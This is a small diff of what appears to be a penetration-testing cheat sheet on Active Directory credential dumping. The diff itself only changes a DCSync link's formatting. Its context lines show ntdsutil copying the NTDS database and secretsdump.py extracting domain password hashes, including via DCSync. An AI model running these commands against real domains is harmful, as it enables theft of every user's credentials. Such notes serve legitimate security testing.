@@ -22,7 +22,7 @@ powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full C:\temp' q q"
 secretsdump.py -security <security> -system <system> -ntds <ntds> local
 ```
 ### Credentials dump
-- If we have administrator credentials, we can perform [[DC Sync]] using secretsdump.py:
+- If we have administrator credentials, we can perform [DCSync](DCSync) using `secretsdump.py`:
 ```powershell
 secretsdump.py -just-dc-ntlm mydomain.local/adminuser@10.10.10.10
 ```
